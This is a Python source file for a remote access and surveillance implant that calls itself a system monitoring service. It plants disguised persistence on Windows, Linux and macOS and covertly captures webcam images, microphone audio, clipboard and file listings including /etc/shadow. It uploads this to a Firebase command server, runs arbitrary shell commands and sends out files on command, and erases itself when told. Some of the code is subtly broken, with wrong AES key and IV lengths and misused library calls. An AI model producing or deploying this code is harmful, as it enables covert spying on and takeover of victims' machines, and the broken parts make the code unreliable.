#!/usr/bin/env python3
import os
import sys
import platform
import subprocess
import socket
import json
import hashlib
import uuid
import time
import threading
from datetime import datetime, timedelta
import psutil
import requests
from Crypto.Cipher import AES
import base64
import zlib
import cv2
import sounddevice as sd
import numpy as np
from PIL import ImageGrab
import firebase_admin # Firebase Realtime Database integration
# === CONFIGURATION ===
FIREBASE_CONFIG = {
    "apiKey": "your-api-key",
    "authDomain": "your-project.firebaseapp.com",
    "databaseURL": "https://your-project.firebaseio.com",
    "projectId": "your-project",
    "storageBucket": "your-project.appspot.com",
    "messagingSenderId": "your-sender-id",
    "appId": "your-app-id"
}

# Firebase paths
COMMAND_PATH = "commands/{device_id}"  # Where to listen for commands
DATA_PATH = "collected_data/{device_id}"  # Where to store collected data
KILLSWITCH_PATH = "killswitches/{device_id}"  # Killswitch control

AUTHORIZED_TARGETS = ["192.168.1.100", "10.0.0.2"]  # Whitelisted IPs
REPORT_INTERVAL = 300  # Seconds between reports (300 = 5 minutes)
PERSISTENCE = True  # Maintain access after reboot

# === SECURITY SETTINGS ===
AES_KEY = b'ThisIsASecretKey123'  # 16/24/32 bytes for AES
AES_IV = b'InitializationVec'  # 16 bytes for AES

# === GLOBAL VARIABLES ===
is_running = True
device_id = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                     for elements in range(0,2*6,2)][::-1])

class FirebaseManager:
    """Handles all Firebase communications and realtime updates"""
    
    def __init__(self):
        self.firebase = firebase_admin.initialize_app(FIREBASE_CONFIG)
        self.db = self.firebase.database()
        self.stream = None
        
    def initialize(self):
        """Set up Firebase connection and command stream"""
        try:
            # Set up killswitch listener
            self.stream = self.db.child(KILLSWITCH_PATH.format(device_id=device_id)).stream(
                self._killswitch_listener)
            return True
        except Exception as e:
            print(f"Firebase initialization error: {str(e)}")
            return False
    
    def _killswitch_listener(self, message):
        """Handle realtime killswitch commands"""
        global is_running
        if message["data"] == "TERMINATE":
            is_running = False
            self_destruct()
    
    def send_data(self, data):
        """Send encrypted data to Firebase"""
        try:
            compressed = zlib.compress(json.dumps(data).encode())
            encrypted = SecureComms.encrypt(compressed)
            
            # Store with timestamp
            self.db.child(DATA_PATH.format(device_id=device_id)).child(
                datetime.now().isoformat()).set(encrypted.decode('utf-8'))
            return True
        except Exception as e:
            print(f"Firebase transmission error: {str(e)}")
            return False
    
    def check_commands(self):
        """Check for pending commands"""
        try:
            commands = self.db.child(COMMAND_PATH.format(device_id=device_id)).get()
            if commands.each() is not None:
                for cmd in commands.each():
                    self._process_command(cmd.key(), cmd.val())
                    self.db.child(COMMAND_PATH.format(
                        device_id=device_id)).child(cmd.key()).remove()
            return True
        except Exception as e:
            print(f"Command check error: {str(e)}")
            return False
    
    def _process_command(self, cmd_id, command):
        """Process received commands"""
        try:
            decrypted = SecureComms.decrypt(command.encode())
            command = json.loads(decrypted)
            
            print(f"Executing command {cmd_id}: {command['action']}")
            
            if command["action"] == "EXECUTE":
                result = subprocess.run(
                    command["command"],
                    shell=True,
                    capture_output=True,
                    text=True
                )
                # Send back results
                self.db.child("command_responses").child(device_id).child(cmd_id).set({
                    "output": result.stdout,
                    "error": result.stderr,
                    "returncode": result.returncode
                })
                
            elif command["action"] == "DOWNLOAD":
                with open(command["remote_path"], 'rb') as f:
                    file_data = base64.b64encode(f.read()).decode('utf-8')
                self.db.child("file_transfers").child(device_id).child(cmd_id).set({
                    "filename": os.path.basename(command["remote_path"]),
                    "data": file_data
                })
                
            elif command["action"] == "CONFIG_UPDATE":
                global REPORT_INTERVAL
                REPORT_INTERVAL = command["interval"]
                
        except Exception as e:
            print(f"Command processing error: {str(e)}")
            self.db.child("command_errors").child(device_id).child(cmd_id).set(
                str(e))

class SecureComms:
    """Handles all encrypted communications using AES-CBC"""
    
    @staticmethod
    def pad(data):
        return data + (AES.block_size - len(data) % AES.block_size) * chr(
            AES.block_size - len(data) % AES.block_size).encode()

    @staticmethod
    def unpad(data):
        return data[:-data[-1]]

    @staticmethod
    def encrypt(raw):
        raw = SecureComms.pad(raw)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        return base64.b64encode(cipher.encrypt(raw))

    @staticmethod
    def decrypt(enc):
        enc = base64.b64decode(enc)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        return SecureComms.unpad(cipher.decrypt(enc)).decode()

def validate_authorization():
    """Verify execution is on approved target"""
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        if ip not in AUTHORIZED_TARGETS:
            self_destruct()
    except:
        self_destruct()

def self_destruct():
    """Remove all traces of the tool"""
    try:
        # Clean up Firebase connection
        if 'firebase' in globals():
            FirebaseManager.db.child("device_status").child(device_id).set("TERMINATED")
        
        # Remove persistence
        if platform.system() == "Windows":
            try:
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE
                )
                winreg.DeleteValue(key, "SystemHealthMonitor")
                winreg.CloseKey(key)
            except:
                pass
        elif platform.system() == "Linux" and os.path.exists("/tmp/systemmonitor.lock"):
            os.remove("/tmp/systemmonitor.lock")
        
        # Remove script
        os.remove(__file__)
        sys.exit(0)
    except:
        sys.exit(1)

def establish_persistence():
    """Ensure continuous operation"""
    if not PERSISTENCE:
        return
        
    if platform.system() == "Windows":
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "SystemHealthMonitor", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
        except:
            pass
            
    elif platform.system() == "Linux":
        cron_cmd = f"@reboot /usr/bin/nohup {sys.executable} {os.path.abspath(__file__)} >/dev/null 2>&1 &"
        subprocess.run(
            f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -',
            shell=True,
            check=False
        )
        
    elif platform.system() == "Darwin":  # macOS
        plist = f"""
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>Label</key>
            <string>com.apple.systemhealth</string>
            <key>ProgramArguments</key>
            <array>
                <string>{sys.executable}</string>
                <string>{os.path.abspath(__file__)}</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
            <key>KeepAlive</key>
            <true/>
            <key>StandardOutPath</key>
            <string>/dev/null</string>
            <key>StandardErrorPath</key>
            <string>/dev/null</string>
        </dict>
        </plist>
        """
        with open(os.path.expanduser('~/Library/LaunchAgents/com.apple.systemhealth.plist'), 'w') as f:
            f.write(plist)
        subprocess.run(['launchctl', 'load', '-w', os.path.expanduser('~/Library/LaunchAgents/com.apple.systemhealth.plist')])

class DataCollector:
    """Handles all intelligence gathering operations"""
    
    @staticmethod
    def get_system_info():
        """Collect comprehensive system data"""
        info = {
            "timestamp": datetime.now().isoformat(),
            "device_id": device_id,
            "system": {
                "platform": platform.platform(),
                "hostname": socket.gethostname(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "mac": device_id,
                "cpu": psutil.cpu_percent(),
                "memory": psutil.virtual_memory().percent,
                "disks": {disk.device: disk.percent for disk in psutil.disk_partitions() if disk.mountpoint},
                "users": [user.name for user in psutil.users()],
                "processes": [proc.name() for proc in psutil.process_iter(['name'])]
            }
        }
        return info
    
    @staticmethod
    def capture_keystrokes(duration=60):
        """Simulate keylogging functionality"""
        # Note: Actual keylogging requires platform-specific implementations
        # This is a placeholder for the concept
        return "Keystroke capture simulated - requires platform-specific implementation"
    
    @staticmethod
    def capture_camera():
        """Capture image from webcam"""
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                return base64.b64encode(buffer).decode('utf-8')
        except:
            return None
    
    @staticmethod
    def record_microphone(duration=10):
        """Record audio from microphone"""
        try:
            fs = 44100  # Sample rate
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
            sd.wait()
            return base64.b64encode(recording.tobytes()).decode('utf-8')
        except:
            return None
    
    @staticmethod
    def get_clipboard():
        """Capture current clipboard content"""
        try:
            return str(ImageGrab.grabclipboard())
        except:
            return "Clipboard access failed"
    
    @staticmethod
    def explore_filesystem(path="/", depth=2):
        """Scan important file locations"""
        important_paths = [
            os.path.expanduser("~"),
            "/etc/passwd",
            "/etc/shadow",
            "/Windows/System32/config",
            "/Program Files",
            "/Program Files (x86)"
        ]
        
        file_tree = {}
        for path in important_paths:
            if os.path.exists(path):
                if os.path.isfile(path):
                    file_tree[path] = {
                        "size": os.path.getsize(path),
                        "modified": os.path.getmtime(path)
                    }
                else:
                    for root, dirs, files in os.walk(path):
                        if root.count(os.sep) - path.count(os.sep) >= depth:
                            del dirs[:]
                            continue
                        for file in files:
                            file_path = os.path.join(root, file)
                            try:
                                file_tree[file_path] = {
                                    "size": os.path.getsize(file_path),
                                    "modified": os.path.getmtime(file_path)
                                }
                            except:
                                continue
        return file_tree

def main():
    """Primary operational loop"""
    print("[*] Initializing System Monitoring Service")
    validate_authorization()
    establish_persistence()
    
    # Initialize Firebase
    firebase_manager = FirebaseManager()
    if not firebase_manager.initialize():
        print("[!] Failed to connect to Firebase")
        time.sleep(60)
        sys.exit(1)
    
    # Set device status
    firebase_manager.db.child("device_status").child(device_id).set({
        "status": "ACTIVE",
        "last_checkin": datetime.now().isoformat(),
        "platform": platform.platform(),
        "ip": socket.gethostbyname(socket.gethostname())
    })
    
    while is_running:
        try:
            # Collect intelligence
            system_report = DataCollector.get_system_info()
            system_report["keystrokes"] = DataCollector.capture_keystrokes()
            system_report["camera"] = DataCollector.capture_camera()
            system_report["microphone"] = DataCollector.record_microphone()
            system_report["clipboard"] = DataCollector.get_clipboard()
            system_report["filesystem"] = DataCollector.explore_filesystem()
            
            # Transmit securely to Firebase
            firebase_manager.send_data(system_report)
            
            # Check for new commands
            firebase_manager.check_commands()
            
            # Update status
            firebase_manager.db.child("device_status").child(device_id).update({
                "last_checkin": datetime.now().isoformat(),
                "next_checkin": (datetime.now() + timedelta(seconds=REPORT_INTERVAL)).isoformat()
            })
            
            # Sleep until next cycle
            time.sleep(REPORT_INTERVAL)
            
        except KeyboardInterrupt:
            is_running = False
        except Exception as e:
            print(f"Error in main loop: {str(e)}")
            time.sleep(60)  # Wait before retrying
    
    # Clean exit
    firebase_manager.db.child("device_status").child(device_id).set("INACTIVE")
    sys.exit(0)

if __name__ == "__main__":
    # Ensure single instance
    try:
        if platform.system() == "Windows":
            import win32event
            mutex = win32event.CreateMutex(None, False, "Global\\SystemMonitorMutex")
            if win32event.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
                sys.exit(0)
        else:
            lock_file = "/tmp/systemmonitor.lock"
            if os.path.exists(lock_file):
                sys.exit(0)
            with open(lock_file, 'w') as f:
                f.write(str(os.getpid()))
                
        main()
    finally:
        if platform.system() != "Windows" and os.path.exists(lock_file):
            os.remove(lock_file)